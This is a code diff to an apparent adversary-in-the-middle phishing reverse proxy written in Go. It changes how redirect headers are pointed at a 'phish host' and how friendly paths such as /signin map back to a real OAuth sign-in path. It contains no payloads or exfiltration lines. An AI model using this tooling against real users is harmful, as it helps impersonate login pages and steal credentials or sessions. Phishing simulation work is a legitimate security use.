@@ -928,6 +928,10 @@ func (m *ProxyHandler) rewriteResponseHeadersWithContext(resp *http.Response, re
 				m.logger.Debugw("found phish host mapping",
 					"original_host", rURL.Host,
 					"phish_host", phishHost)
+
+				// apply URL path rewrites using the redirect URL's host domain, not current request's domain
+				rURL.Path = m.rewriteURLPathForDomain(rURL.Path, rURL.Host, reqCtx)
+
 				rURL.Host = phishHost
 				resp.Header.Set("Location", rURL.String())
 				m.logger.Debugw("rewrote location header",
@@ -4748,185 +4752,58 @@ func (m *ProxyHandler) checkFilter(req *http.Request, reqCtx *RequestContext) (b
 }
 
 // checkAndApplyURLRewrite checks if the incoming request matches any URL rewrite rules
-// and returns a redirect response if a match is found
+// and translates friendly paths back to original paths for forwarding to target
 func (m *ProxyHandler) checkAndApplyURLRewrite(req *http.Request, reqCtx *RequestContext) *http.Response {
-	// check if this is already a rewritten URL that we need to reverse map
-	// lookup by path and target domain to handle query parameter variations
-	originalPath := m.getReverseURLMapping(req.URL.Path, reqCtx.TargetDomain)
-	if originalPath != "" {
-		// reverse query parameters first (before changing path)
-		rewrittenPath := req.URL.Path
-		m.reverseQueryParameters(req, rewrittenPath, reqCtx.TargetDomain)
-		// update request to use the original path
-		req.URL.Path = originalPath
-		return nil
-	}
-
-	// check for URL rewrite rules in domain config
+	// get URL rewrite rules from domain and global config
 	var rewriteRules []service.ProxyServiceURLRewriteRule
 	if domainConfig, exists := reqCtx.ProxyConfig.Hosts[reqCtx.TargetDomain]; exists && domainConfig.RewriteURLs != nil {
 		rewriteRules = append(rewriteRules, domainConfig.RewriteURLs...)
 	}
-
-	// check for URL rewrite rules in global config
 	if reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.RewriteURLs != nil {
 		rewriteRules = append(rewriteRules, reqCtx.ProxyConfig.Global.RewriteURLs...)
 	}
 
-	// check each rewrite rule
+	// check if incoming request matches a friendly path (replace) and translate to original (find)
+	// rule.Find = original path on target (e.g., /common/oauth2/v2.0/authorize)
+	// rule.Replace = friendly path shown to user (e.g., /signin)
+	// when user requests friendly path, we translate to original and forward to target
 	for _, rule := range rewriteRules {
-		if matched, rewrittenURL := m.applyURLRewriteRule(req, rule); matched {
-			// store the mapping for reverse lookup using path only (not query)
-			// this allows the mapping to work even if query parameters change
-			rewrittenPath := rewrittenURL
-			if idx := strings.Index(rewrittenURL, "?"); idx != -1 {
-				rewrittenPath = rewrittenURL[:idx]
+		// match against the friendly path (replace) - exact match only
+		if req.URL.Path == rule.Replace {
+			// translate to original path (find) - strip regex anchors
+			originalPath := strings.TrimPrefix(rule.Find, "^")
+			originalPath = strings.TrimSuffix(originalPath, "$")
+
+			// reverse query parameters based on rule's query mappings
+			if len(rule.Query) > 0 {
+				query := req.URL.Query()
+				reversedQuery := url.Values{}
+
+				// copy all parameters first
+				for key, values := range query {
+					reversedQuery[key] = values
+				}
+
+				// reverse the mapped parameters (friendly → original)
+				for _, qRule := range rule.Query {
+					if values, exists := query[qRule.Replace]; exists {
+						delete(reversedQuery, qRule.Replace)
+						reversedQuery[qRule.Find] = values
+					}
+				}
+
+				req.URL.RawQuery = reversedQuery.Encode()
 			}
-			m.storeURLMapping(rewrittenPath, req.URL.Path, reqCtx.TargetDomain)
 
-			// store query parameter mappings for reverse lookup
-			m.storeQueryParameterMappings(rewrittenPath, rule.Query, reqCtx.TargetDomain)
-
-			// rewrite the request URL internally (don't redirect)
-			// parse the rewritten URL to extract path and query
-			if parsedURL, err := url.Parse(rewrittenURL); err == nil {
-				req.URL.Path = parsedURL.Path
-				req.URL.RawQuery = parsedURL.RawQuery
-			}
-
-			// continue processing with rewritten URL
+			// rewrite request to use original path
+			req.URL.Path = originalPath
 			return nil
 		}
 	}
 
+	// if request is to original path, just forward as-is - it's already correct for target
+	// this handles edge cases where original URLs weren't rewritten (external links, etc.)
 	return nil
-}
-
-// applyURLRewriteRule checks if a URL matches a rewrite rule and returns the rewritten URL
-func (m *ProxyHandler) applyURLRewriteRule(req *http.Request, rule service.ProxyServiceURLRewriteRule) (bool, string) {
-	// compile regex pattern
-	pathRegex, err := regexp.Compile(rule.Find)
-	if err != nil {
-		m.logger.Errorw("invalid URL rewrite regex pattern", "pattern", rule.Find, "error", err)
-		return false, ""
-	}
-
-	// check if path matches
-	if !pathRegex.MatchString(req.URL.Path) {
-		return false, ""
-	}
-
-	// build rewritten URL
-	rewrittenPath := rule.Replace
-	rewrittenQuery := m.rewriteQueryParameters(req.URL.Query(), rule.Query, rule.Filter)
-
-	// construct full rewritten URL
-	rewrittenURL := rewrittenPath
-	if rewrittenQuery != "" {
-		rewrittenURL += "?" + rewrittenQuery
-	}
-
-	return true, rewrittenURL
-}
-
-// rewriteQueryParameters applies query parameter mapping rules
-func (m *ProxyHandler) rewriteQueryParameters(originalQuery url.Values, queryRules []service.ProxyServiceURLRewriteQueryParam, filter []string) string {
-	rewrittenQuery := url.Values{}
-
-	// if filter list is empty, keep all parameters and apply mappings
-	if len(filter) == 0 {
-		// start with all original parameters
-		for key, values := range originalQuery {
-			rewrittenQuery[key] = values
-		}
-
-		// apply parameter mappings
-		for _, rule := range queryRules {
-			if values, exists := originalQuery[rule.Find]; exists {
-				// remove the old key and add the new one
-				delete(rewrittenQuery, rule.Find)
-				rewrittenQuery[rule.Replace] = values
-			}
-		}
-	} else {
-		// only keep parameters in the filter list
-		for _, key := range filter {
-			if values, exists := originalQuery[key]; exists {
-				rewrittenQuery[key] = values
-			}
-		}
-
-		// apply mappings only to filtered parameters
-		for _, rule := range queryRules {
-			if values, exists := originalQuery[rule.Find]; exists && contains(filter, rule.Find) {
-				// remove the old key and add the new one
-				delete(rewrittenQuery, rule.Find)
-				rewrittenQuery[rule.Replace] = values
-			}
-		}
-	}
-
-	return rewrittenQuery.Encode()
-}
-
-// contains checks if a string slice contains a specific string
-func contains(slice []string, item string) bool {
-	for _, s := range slice {
-		if s == item {
-			return true
-		}
-	}
-	return false
-}
-
-// storeURLMapping stores the mapping between rewritten and original URLs
-func (m *ProxyHandler) storeURLMapping(rewrittenURL, originalURL, targetDomain string) {
-	key := targetDomain + "|" + rewrittenURL
-	m.SessionManager.StoreURLMapping(key, originalURL)
-}
-
-// storeQueryParameterMappings stores query parameter mappings for reverse lookup
-func (m *ProxyHandler) storeQueryParameterMappings(rewrittenPath string, queryRules []service.ProxyServiceURLRewriteQueryParam, targetDomain string) {
-	key := targetDomain + "|" + rewrittenPath
-	m.SessionManager.StoreQueryParameterMappings(key, queryRules)
-}
-
-// getReverseURLMapping gets the original path for a rewritten path
-// uses path and target domain for lookup to handle per-host configurations
-func (m *ProxyHandler) getReverseURLMapping(path, targetDomain string) string {
-	key := targetDomain + "|" + path
-	if originalPath, exists := m.SessionManager.GetURLMapping(key); exists {
-		return originalPath
-	}
-	return ""
-}
-
-// reverseQueryParameters reverses query parameter names back to their originals
-func (m *ProxyHandler) reverseQueryParameters(req *http.Request, rewrittenPath, targetDomain string) {
-	key := targetDomain + "|" + rewrittenPath
-	queryRules, exists := m.SessionManager.GetQueryParameterMappings(key)
-	if !exists || len(queryRules) == 0 {
-		return
-	}
-
-	query := req.URL.Query()
-	reversedQuery := url.Values{}
-
-	// copy all parameters first
-	for key, values := range query {
-		reversedQuery[key] = values
-	}
-
-	// reverse the mapped parameters
-	for _, rule := range queryRules {
-		if values, exists := query[rule.Replace]; exists {
-			// remove the rewritten key and restore the original key
-			delete(reversedQuery, rule.Replace)
-			reversedQuery[rule.Find] = values
-		}
-	}
-
-	req.URL.RawQuery = reversedQuery.Encode()
 }
 
 // applyURLPathRewrites applies URL path rewriting to response body content
@@ -4956,10 +4833,48 @@ func (m *ProxyHandler) applyURLPathRewritesWithoutSession(body []byte, reqCtx *R
 	return m.applyURLPathRewrites(body, reqCtx)
 }
 
+// rewriteURLPathForDomain rewrites a single URL path from original to friendly based on rewrite rules for a specific domain
+func (m *ProxyHandler) rewriteURLPathForDomain(path string, targetDomain string, reqCtx *RequestContext) string {
+	// get URL rewrite rules from the specified domain's config
+	var rewriteRules []service.ProxyServiceURLRewriteRule
+	if domainConfig, exists := reqCtx.ProxyConfig.Hosts[targetDomain]; exists && domainConfig.RewriteURLs != nil {
+		rewriteRules = append(rewriteRules, domainConfig.RewriteURLs...)
+	}
+	// also check global config
+	if reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.RewriteURLs != nil {
+		rewriteRules = append(rewriteRules, reqCtx.ProxyConfig.Global.RewriteURLs...)
+	}
+
+	// check each rule to see if path matches the original (find) pattern
+	for _, rule := range rewriteRules {
+		// strip regex anchors for matching
+		pattern := strings.TrimPrefix(rule.Find, "^")
+		pattern = strings.TrimSuffix(pattern, "$")
+
+		pathRegex, err := regexp.Compile("^" + pattern)
+		if err != nil {
+			continue
+		}
+
+		if pathRegex.MatchString(path) {
+			// replace with friendly path
+			return rule.Replace
+		}
+	}
+
+	return path
+}
+
 // rewritePathsInContent rewrites URL paths in HTML/JS content according to rewrite rules
 func (m *ProxyHandler) rewritePathsInContent(content string, rule service.ProxyServiceURLRewriteRule) string {
+	// strip regex anchors for body rewriting - anchors are meant for request path matching
+	// but in response body the paths appear mid-string (e.g., href="/path")
+	pattern := rule.Find
+	pattern = strings.TrimPrefix(pattern, "^")
+	pattern = strings.TrimSuffix(pattern, "$")
+
 	// compile regex pattern for finding URLs in content
-	pathRegex, err := regexp.Compile(rule.Find)
+	pathRegex, err := regexp.Compile(pattern)
 	if err != nil {
 		m.logger.Errorw("invalid URL rewrite regex pattern", "pattern", rule.Find, "error", err)
 		return content
